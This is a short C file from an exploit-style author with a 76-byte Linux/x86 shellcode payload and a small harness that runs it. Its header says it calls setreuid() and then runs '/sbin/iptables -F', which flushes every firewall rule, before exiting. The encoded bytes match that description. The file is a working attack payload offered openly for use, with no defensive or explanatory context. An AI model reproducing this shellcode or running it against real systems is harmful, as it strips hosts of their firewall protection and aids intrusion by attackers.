/*
 *      Author: Sh3llc0d3
 *      Environment: Linux/x86
 *      Developed from: GNU ASM (AT&T Syntax)
 *      Purpose: [setreuid()] -> [/sbin/iptables -F] -> [exit(0)]
 *      Size: 76 bytes
 *
 *      Website:        root-exploit.com
 */
char code[] =   "\xeb\x33\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x5e\x31\xc0\x88\x46"
                "\x0e\x88\x46\x11\x89\x76\x12\x8d\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0"
                "\x0b\x89\xf3\x8d\x4e\x12\x8d\x56\x1a\xcd\x80\x31\xc0\xb0\x01\x31\xdb"
                "\xcd\x80\xe8\xc8\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61"
                "\x62\x6c\x65\x73\x23\x2d\x46\x23";

int main(int argc, char **argv)
{
        int (*func)();
        func = (int (*)()) code;
        (int)(*func)();
}




